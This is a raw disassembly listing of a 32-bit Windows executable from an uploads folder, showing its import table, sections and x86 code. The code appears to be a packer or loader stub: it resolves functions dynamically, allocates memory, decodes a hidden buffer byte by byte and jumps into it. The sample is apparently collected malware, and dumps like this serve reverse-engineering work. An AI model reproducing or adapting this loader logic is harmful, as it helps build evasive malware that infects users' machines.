
./web_dev/uploads/000077419ead44800537b34f5c2137e572c472698a13c39151f90eaabde7c94e_1.exe:	file format coff-i386

architecture: i386
start address: 0x000011d4

The Import Tables:
  lookup 00005f2c time 00000000 fwd 00000000 name 00005ff8 addr 00002008

    DLL Name: KERNEL32.dll
    Hint/Ord  Name
         346  GetLastError
         171  ExitProcess
         422  GetSystemDirectoryA
         359  GetModuleHandleA
          44  CloseHandle
         837  UnmapViewOfFile
         926  lstrlenA
         856  VirtualFree
         393  GetProcAddress

  lookup 00005f54 time 00000000 fwd 00000000 name 00006012 addr 00002030

    DLL Name: USER32.dll
    Hint/Ord  Name
         728  wsprintfA

  lookup 00005f5c time 00000000 fwd 00000000 name 00006030 addr 00002038

    DLL Name: ole32.dll
    Hint/Ord  Name
         101  CoUninitialize

  lookup 00005f24 time 00000000 fwd 00000000 name 0000604e addr 00002000

    DLL Name: CRYPT32.dll
    Hint/Ord  Name
         266  PFXVerifyPassword

Export Table:
Sections:
Idx Name          Size     VMA      Type
  0 .text         000004a4 00401000 TEXT
  1 .rdata        0000405a 00402000 DATA
  2 .data         0002e000 00407000 DATA BSS
  3 .rsrc         0002175a 004c4000 DATA

SYMBOL TABLE:

Disassembly of section .text:

00401000 <.text>:
  401000: 55                           	pushl	%ebp
  401001: 8b ec                        	movl	%esp, %ebp
  401003: 83 ec 50                     	subl	$80, %esp
  401006: c7 45 d8 00 00 00 00         	movl	$0, -40(%ebp)
  40100d: c7 45 e8 00 00 00 00         	movl	$0, -24(%ebp)
  401014: c7 45 b0 00 00 00 00         	movl	$0, -80(%ebp)
  40101b: c7 45 c0 00 00 00 00         	movl	$0, -64(%ebp)
  401022: c7 45 f8 00 00 00 00         	movl	$0, -8(%ebp)
  401029: c7 45 b4 00 00 00 00         	movl	$0, -76(%ebp)
  401030: c7 45 b8 00 00 00 00         	movl	$0, -72(%ebp)
  401037: c7 45 ec 00 00 00 00         	movl	$0, -20(%ebp)
  40103e: c7 45 d4 00 00 00 00         	movl	$0, -44(%ebp)
  401045: c7 45 f0 00 00 00 00         	movl	$0, -16(%ebp)
  40104c: c7 45 c8 00 00 00 00         	movl	$0, -56(%ebp)
  401053: c7 45 fc 00 00 00 00         	movl	$0, -4(%ebp)
  40105a: c7 45 c4 00 00 00 00         	movl	$0, -60(%ebp)
  401061: c7 45 e0 00 00 00 00         	movl	$0, -32(%ebp)
  401068: c7 45 cc 00 00 00 00         	movl	$0, -52(%ebp)
  40106f: c7 45 e4 00 00 00 00         	movl	$0, -28(%ebp)
  401076: c7 45 d0 00 00 00 00         	movl	$0, -48(%ebp)
  40107d: c7 45 f4 00 00 00 00         	movl	$0, -12(%ebp)
  401084: c7 45 e0 40 00 00 00         	movl	$64, -32(%ebp)
  40108b: 6a 0a                        	pushl	$10
  40108d: 68 68 4f 43 00               	pushl	$4411240
  401092: 8d 45 d0                     	leal	-48(%ebp), %eax
  401095: 50                           	pushl	%eax
  401096: ff 15 00 20 40 00            	calll	*4202496
  40109c: ff 15 08 20 40 00            	calll	*4202504
  4010a2: 89 45 e4                     	movl	%eax, -28(%ebp)
  4010a5: 0f b7 4d e4                  	movzwl	-28(%ebp), %ecx
  4010a9: 81 f9 02 20 00 00            	cmpl	$8194, %ecx
  4010af: 75 1e                        	jne	0x4010cf <.text+0xcf>
  4010b1: c7 45 ec 0d 0e 00 00         	movl	$3597, -20(%ebp)
  4010b8: c7 45 cc 3a 00 00 00         	movl	$58, -52(%ebp)
  4010bf: c7 45 f8 f0 49 d7 7b         	movl	$2077706736, -8(%ebp)
  4010c6: c7 45 b8 3f fd 0d 00         	movl	$916799, -72(%ebp)
  4010cd: eb 2a                        	jmp	0x4010f9 <.text+0xf9>
  4010cf: 68 10 28 40 00               	pushl	$4204560
  4010d4: ff 15 14 20 40 00            	calll	*4202516
  4010da: 89 45 e4                     	movl	%eax, -28(%ebp)
  4010dd: 68 20 4f 40 00               	pushl	$4214560
  4010e2: ff 15 14 20 40 00            	calll	*4202516
  4010e8: 89 45 e4                     	movl	%eax, -28(%ebp)
  4010eb: 68 40 20 40 00               	pushl	$4202560
  4010f0: ff 15 14 20 40 00            	calll	*4202516
  4010f6: 89 45 e4                     	movl	%eax, -28(%ebp)
  4010f9: 6a 00                        	pushl	$0
  4010fb: ff 15 14 20 40 00            	calll	*4202516
  401101: 89 45 e4                     	movl	%eax, -28(%ebp)
  401104: c7 45 c0 ff ff ff ff         	movl	$4294967295, -64(%ebp)
  40110b: ff 35 14 20 40 00            	pushl	4202516
  401111: 5a                           	popl	%edx
  401112: 89 55 b4                     	movl	%edx, -76(%ebp)
  401115: 68 60 4e 43 00               	pushl	$4410976
  40111a: ff 15 14 20 40 00            	calll	*4202516
  401120: 89 45 c0                     	movl	%eax, -64(%ebp)
  401123: 68 70 4e 43 00               	pushl	$4410992
  401128: 8b 55 c0                     	movl	-64(%ebp), %edx
  40112b: 52                           	pushl	%edx
  40112c: ff 15 28 20 40 00            	calll	*4202536
  401132: 89 45 dc                     	movl	%eax, -36(%ebp)
  401135: 8b 45 e0                     	movl	-32(%ebp), %eax
  401138: 50                           	pushl	%eax
  401139: 68 00 10 00 00               	pushl	$4096
  40113e: 8b 4d ec                     	movl	-20(%ebp), %ecx
  401141: 83 c1 14                     	addl	$20, %ecx
  401144: 51                           	pushl	%ecx
  401145: 6a 00                        	pushl	$0
  401147: 6a ff                        	pushl	$-1
  401149: ff 55 dc                     	calll	*-36(%ebp)
  40114c: 89 45 fc                     	movl	%eax, -4(%ebp)
  40114f: 8b 55 b8                     	movl	-72(%ebp), %edx
  401152: 81 ea 0b ae 0d 00            	subl	$896523, %edx
  401158: 89 55 b8                     	movl	%edx, -72(%ebp)
  40115b: 8b 45 fc                     	movl	-4(%ebp), %eax
  40115e: 03 45 ec                     	addl	-20(%ebp), %eax
  401161: 8b 4d f8                     	movl	-8(%ebp), %ecx
  401164: 89 08                        	movl	%ecx, (%eax)
  401166: 8b 55 fc                     	movl	-4(%ebp), %edx
  401169: 03 55 cc                     	addl	-52(%ebp), %edx
  40116c: 89 55 c4                     	movl	%edx, -60(%ebp)
  40116f: a1 28 20 40 00               	movl	4202536, %eax
  401174: 89 45 d4                     	movl	%eax, -44(%ebp)
  401177: 8b 4d fc                     	movl	-4(%ebp), %ecx
  40117a: 03 4d ec                     	addl	-20(%ebp), %ecx
  40117d: 8b 55 08                     	movl	8(%ebp), %edx
  401180: 89 51 04                     	movl	%edx, 4(%ecx)
  401183: 8b 45 fc                     	movl	-4(%ebp), %eax
  401186: 03 45 ec                     	addl	-20(%ebp), %eax
  401189: 89 45 f4                     	movl	%eax, -12(%ebp)
  40118c: 83 7d b8 00                  	cmpl	$0, -72(%ebp)
  401190: 76 1b                        	jbe	0x4011ad <.text+0x1ad>
  401192: 8b 4d f4                     	movl	-12(%ebp), %ecx
  401195: 51                           	pushl	%ecx
  401196: 8b 55 ec                     	movl	-20(%ebp), %edx
  401199: 52                           	pushl	%edx
  40119a: 8b 45 e4                     	movl	-28(%ebp), %eax
  40119d: 03 45 b8                     	addl	-72(%ebp), %eax
  4011a0: 50                           	pushl	%eax
  4011a1: 8b 4d fc                     	movl	-4(%ebp), %ecx
  4011a4: 51                           	pushl	%ecx
  4011a5: e8 0b 02 00 00               	calll	0x4013b5 <.text+0x3b5>
  4011aa: 83 c4 10                     	addl	$16, %esp
  4011ad: 83 7d c4 00                  	cmpl	$0, -60(%ebp)
  4011b1: 74 0d                        	je	0x4011c0 <.text+0x1c0>
  4011b3: ff 75 d4                     	pushl	-44(%ebp)
  4011b6: ff 75 b4                     	pushl	-76(%ebp)
  4011b9: 8b 4d c4                     	movl	-60(%ebp), %ecx
  4011bc: ff d1                        	calll	*%ecx
  4011be: eb 06                        	jmp	0x4011c6 <.text+0x1c6>
  4011c0: 8b 55 08                     	movl	8(%ebp), %edx
  4011c3: 89 55 e8                     	movl	%edx, -24(%ebp)
  4011c6: b8 01 00 00 00               	movl	$1, %eax
  4011cb: 8b e5                        	movl	%ebp, %esp
  4011cd: 5d                           	popl	%ebp
  4011ce: c3                           	retl
  4011cf: 55                           	pushl	%ebp
  4011d0: 8b ec                        	movl	%esp, %ebp
  4011d2: 5d                           	popl	%ebp
  4011d3: c3                           	retl
  4011d4: 55                           	pushl	%ebp
  4011d5: 8b ec                        	movl	%esp, %ebp
  4011d7: 83 ec 1c                     	subl	$28, %esp
  4011da: c7 45 f4 00 00 00 00         	movl	$0, -12(%ebp)
  4011e1: c7 45 fc 00 00 00 00         	movl	$0, -4(%ebp)
  4011e8: c7 45 e8 00 00 00 00         	movl	$0, -24(%ebp)
  4011ef: c7 45 ec 00 00 00 00         	movl	$0, -20(%ebp)
  4011f6: 6a 08                        	pushl	$8
  4011f8: 8d 45 f8                     	leal	-8(%ebp), %eax
  4011fb: 50                           	pushl	%eax
  4011fc: ff 15 10 20 40 00            	calll	*4202512
  401202: 8b 4d f4                     	movl	-12(%ebp), %ecx
  401205: 51                           	pushl	%ecx
  401206: e8 36 00 00 00               	calll	0x401241 <.text+0x241>
  40120b: 83 c4 04                     	addl	$4, %esp
  40120e: e8 b8 00 00 00               	calll	0x4012cb <.text+0x2cb>
  401213: c7 45 e4 00 00 00 00         	movl	$0, -28(%ebp)
  40121a: eb 09                        	jmp	0x401225 <.text+0x225>
  40121c: 8b 55 e4                     	movl	-28(%ebp), %edx
  40121f: 83 c2 01                     	addl	$1, %edx
  401222: 89 55 e4                     	movl	%edx, -28(%ebp)
  401225: 83 7d e4 64                  	cmpl	$100, -28(%ebp)
  401229: 73 02                        	jae	0x40122d <.text+0x22d>
  40122b: eb ef                        	jmp	0x40121c <.text+0x21c>
  40122d: ff 15 38 20 40 00            	calll	*4202552
  401233: 6a 00                        	pushl	$0
  401235: ff 15 0c 20 40 00            	calll	*4202508
  40123b: 8b e5                        	movl	%ebp, %esp
  40123d: 5d                           	popl	%ebp
  40123e: c2 10 00                     	retl	$16
  401241: 55                           	pushl	%ebp
  401242: 8b ec                        	movl	%esp, %ebp
  401244: 83 ec 3c                     	subl	$60, %esp
  401247: 56                           	pushl	%esi
  401248: c7 45 c4 00 00 00 00         	movl	$0, -60(%ebp)
  40124f: c7 45 c8 00 00 00 00         	movl	$0, -56(%ebp)
  401256: c7 45 d0 00 00 00 00         	movl	$0, -48(%ebp)
  40125d: c7 45 dc 00 00 00 00         	movl	$0, -36(%ebp)
  401264: c7 45 e4 00 00 00 00         	movl	$0, -28(%ebp)
  40126b: c7 45 d8 00 00 00 00         	movl	$0, -40(%ebp)
  401272: c7 45 d4 80 4e 43 00         	movl	$4411008, -44(%ebp)
  401279: c7 45 dc 54 ee 76 59         	movl	$1500966484, -36(%ebp)
  401280: c7 45 cc 00 00 00 00         	movl	$0, -52(%ebp)
  401287: 8b 45 dc                     	movl	-36(%ebp), %eax
  40128a: 89 45 e0                     	movl	%eax, -32(%ebp)
  40128d: 8b 0d 08 20 40 00            	movl	4202504, %ecx
  401293: 89 4d fc                     	movl	%ecx, -4(%ebp)
  401296: 68 00 80 00 00               	pushl	$32768
  40129b: 6a 00                        	pushl	$0
  40129d: 8b 55 c8                     	movl	-56(%ebp), %edx
  4012a0: 52                           	pushl	%edx
  4012a1: ff 15 24 20 40 00            	calll	*4202532
  4012a7: 8b 75 fc                     	movl	-4(%ebp), %esi
  4012aa: ff d6                        	calll	*%esi
  4012ac: 89 45 c8                     	movl	%eax, -56(%ebp)
  4012af: 81 7d c8 e7 01 00 00         	cmpl	$487, -56(%ebp)
  4012b6: 75 0c                        	jne	0x4012c4 <.text+0x2c4>
  4012b8: 8b 45 e0                     	movl	-32(%ebp), %eax
  4012bb: 50                           	pushl	%eax
  4012bc: e8 3f fd ff ff               	calll	0x401000 <.text>
  4012c1: 83 c4 04                     	addl	$4, %esp
  4012c4: 33 c0                        	xorl	%eax, %eax
  4012c6: 5e                           	popl	%esi
  4012c7: 8b e5                        	movl	%ebp, %esp
  4012c9: 5d                           	popl	%ebp
  4012ca: c3                           	retl
  4012cb: 55                           	pushl	%ebp
  4012cc: 8b ec                        	movl	%esp, %ebp
  4012ce: 81 ec 28 01 00 00            	subl	$296, %esp
  4012d4: 8b 85 04 ff ff ff            	movl	-252(%ebp), %eax
  4012da: 03 85 0c ff ff ff            	addl	-244(%ebp), %eax
  4012e0: 89 45 f8                     	movl	%eax, -8(%ebp)
  4012e3: 8b 4d f8                     	movl	-8(%ebp), %ecx
  4012e6: 8b 11                        	movl	(%ecx), %edx
  4012e8: 89 55 fc                     	movl	%edx, -4(%ebp)
  4012eb: 8b 45 fc                     	movl	-4(%ebp), %eax
  4012ee: c1 e0 02                     	shll	$2, %eax
  4012f1: 3d 00 1c 02 00               	cmpl	$138240, %eax
  4012f6: 75 0c                        	jne	0x401304 <.text+0x304>
  4012f8: c7 85 d8 fe ff ff 9c 4e 43 00	movl	$4411036, -296(%ebp)
  401302: eb 0a                        	jmp	0x40130e <.text+0x30e>
  401304: c7 85 d8 fe ff ff a0 4e 43 00	movl	$4411040, -296(%ebp)
  40130e: 8b 8d d8 fe ff ff            	movl	-296(%ebp), %ecx
  401314: 51                           	pushl	%ecx
  401315: 8b 55 fc                     	movl	-4(%ebp), %edx
  401318: 52                           	pushl	%edx
  401319: 68 a8 4e 43 00               	pushl	$4411048
  40131e: 8d 85 28 ff ff ff            	leal	-216(%ebp), %eax
  401324: 50                           	pushl	%eax
  401325: ff 15 30 20 40 00            	calll	*4202544
  40132b: 83 c4 10                     	addl	$16, %esp
  40132e: 8d 8d 28 ff ff ff            	leal	-216(%ebp), %ecx
  401334: 51                           	pushl	%ecx
  401335: ff 15 20 20 40 00            	calll	*4202528
  40133b: 8b 95 04 ff ff ff            	movl	-252(%ebp), %edx
  401341: 52                           	pushl	%edx
  401342: ff 15 1c 20 40 00            	calll	*4202524
  401348: 89 45 f0                     	movl	%eax, -16(%ebp)
  40134b: 8b 85 08 ff ff ff            	movl	-248(%ebp), %eax
  401351: 50                           	pushl	%eax
  401352: ff 15 18 20 40 00            	calll	*4202520
  401358: 89 45 f0                     	movl	%eax, -16(%ebp)
  40135b: 83 7d f0 00                  	cmpl	$0, -16(%ebp)
  40135f: 75 1c                        	jne	0x40137d <.text+0x37d>
  401361: ff 15 08 20 40 00            	calll	*4202504
  401367: 50                           	pushl	%eax
  401368: 68 dc 4e 43 00               	pushl	$4411100
  40136d: 8d 8d 28 ff ff ff            	leal	-216(%ebp), %ecx
  401373: 51                           	pushl	%ecx
  401374: ff 15 30 20 40 00            	calll	*4202544
  40137a: 83 c4 0c                     	addl	$12, %esp
  40137d: 8b 95 10 ff ff ff            	movl	-240(%ebp), %edx
  401383: 52                           	pushl	%edx
  401384: ff 15 18 20 40 00            	calll	*4202520
  40138a: 89 45 f0                     	movl	%eax, -16(%ebp)
  40138d: 83 7d f0 00                  	cmpl	$0, -16(%ebp)
  401391: 75 1c                        	jne	0x4013af <.text+0x3af>
  401393: ff 15 08 20 40 00            	calll	*4202504
  401399: 50                           	pushl	%eax
  40139a: 68 0c 4f 43 00               	pushl	$4411148
  40139f: 8d 85 28 ff ff ff            	leal	-216(%ebp), %eax
  4013a5: 50                           	pushl	%eax
  4013a6: ff 15 30 20 40 00            	calll	*4202544
  4013ac: 83 c4 0c                     	addl	$12, %esp
  4013af: 33 c0                        	xorl	%eax, %eax
  4013b1: 8b e5                        	movl	%ebp, %esp
  4013b3: 5d                           	popl	%ebp
  4013b4: c3                           	retl
  4013b5: 55                           	pushl	%ebp
  4013b6: 8b ec                        	movl	%esp, %ebp
  4013b8: 83 ec 2c                     	subl	$44, %esp
  4013bb: 53                           	pushl	%ebx
  4013bc: c7 45 fc fe ff ff ff         	movl	$4294967294, -4(%ebp)
  4013c3: c7 45 f4 00 00 00 00         	movl	$0, -12(%ebp)
  4013ca: c7 45 e0 01 00 00 00         	movl	$1, -32(%ebp)
  4013d1: c7 45 f0 00 00 00 00         	movl	$0, -16(%ebp)
  4013d8: 8b 45 0c                     	movl	12(%ebp), %eax
  4013db: 89 45 e4                     	movl	%eax, -28(%ebp)
  4013de: c7 45 e8 00 00 00 00         	movl	$0, -24(%ebp)
  4013e5: c7 45 f8 00 00 00 00         	movl	$0, -8(%ebp)
  4013ec: c7 45 dc 00 00 00 00         	movl	$0, -36(%ebp)
  4013f3: 8b 4d fc                     	movl	-4(%ebp), %ecx
  4013f6: 83 e9 01                     	subl	$1, %ecx
  4013f9: 89 4d fc                     	movl	%ecx, -4(%ebp)
  4013fc: 8b 55 08                     	movl	8(%ebp), %edx
  4013ff: 89 55 f0                     	movl	%edx, -16(%ebp)
  401402: c7 45 d8 01 00 00 00         	movl	$1, -40(%ebp)
  401409: 8b 45 fc                     	movl	-4(%ebp), %eax
  40140c: 83 c0 02                     	addl	$2, %eax
  40140f: 89 45 fc                     	movl	%eax, -4(%ebp)
  401412: 8b 4d e4                     	movl	-28(%ebp), %ecx
  401415: 03 4d fc                     	addl	-4(%ebp), %ecx
  401418: 8a 51 01                     	movb	1(%ecx), %dl
  40141b: 88 55 ef                     	movb	%dl, -17(%ebp)
  40141e: 8b 45 fc                     	movl	-4(%ebp), %eax
  401421: 83 c0 01                     	addl	$1, %eax
  401424: 89 45 fc                     	movl	%eax, -4(%ebp)
  401427: 8a 4d ef                     	movb	-17(%ebp), %cl
  40142a: 88 4d d7                     	movb	%cl, -41(%ebp)
  40142d: 8b 55 f0                     	movl	-16(%ebp), %edx
  401430: 03 55 fc                     	addl	-4(%ebp), %edx
  401433: 8a 45 d7                     	movb	-41(%ebp), %al
  401436: 88 02                        	movb	%al, (%edx)
  401438: b9 00 00 00 00               	movl	$0, %ecx
  40143d: 8b 4d 14                     	movl	20(%ebp), %ecx
  401440: 03 4d f8                     	addl	-8(%ebp), %ecx
  401443: 0f b6 11                     	movzbl	(%ecx), %edx
  401446: 89 55 f4                     	movl	%edx, -12(%ebp)
  401449: 8b 45 f8                     	movl	-8(%ebp), %eax
  40144c: 03 45 d8                     	addl	-40(%ebp), %eax
  40144f: 89 45 f8                     	movl	%eax, -8(%ebp)
  401452: 8b 4d f8                     	movl	-8(%ebp), %ecx
  401455: c1 e9 03                     	shrl	$3, %ecx
  401458: ba 01 00 00 00               	movl	$1, %edx
  40145d: 2b d1                        	subl	%ecx, %edx
  40145f: 89 55 e0                     	movl	%edx, -32(%ebp)
  401462: 33 d9                        	xorl	%ecx, %ebx
  401464: 8b 45 f8                     	movl	-8(%ebp), %eax
  401467: 0f af 45 e0                  	imull	-32(%ebp), %eax
  40146b: 89 45 f8                     	movl	%eax, -8(%ebp)
  40146e: 8b c3                        	movl	%ebx, %eax
  401470: 8b 4d f0                     	movl	-16(%ebp), %ecx
  401473: 03 4d fc                     	addl	-4(%ebp), %ecx
  401476: 0f b6 11                     	movzbl	(%ecx), %edx
  401479: 03 55 f4                     	addl	-12(%ebp), %edx
  40147c: 88 55 d6                     	movb	%dl, -42(%ebp)
  40147f: 8b 45 f0                     	movl	-16(%ebp), %eax
  401482: 03 45 fc                     	addl	-4(%ebp), %eax
  401485: 8a 4d d6                     	movb	-42(%ebp), %cl
  401488: 88 08                        	movb	%cl, (%eax)
  40148a: 8b 55 fc                     	movl	-4(%ebp), %edx
  40148d: 83 ea 02                     	subl	$2, %edx
  401490: 89 55 fc                     	movl	%edx, -4(%ebp)
  401493: 8b 45 fc                     	movl	-4(%ebp), %eax
  401496: 3b 45 10                     	cmpl	16(%ebp), %eax
  401499: 0f 8c 6a ff ff ff            	jl	0x401409 <.text+0x409>
  40149f: 5b                           	popl	%ebx
  4014a0: 8b e5                        	movl	%ebp, %esp
  4014a2: 5d                           	popl	%ebp
  4014a3: c3                           	retl
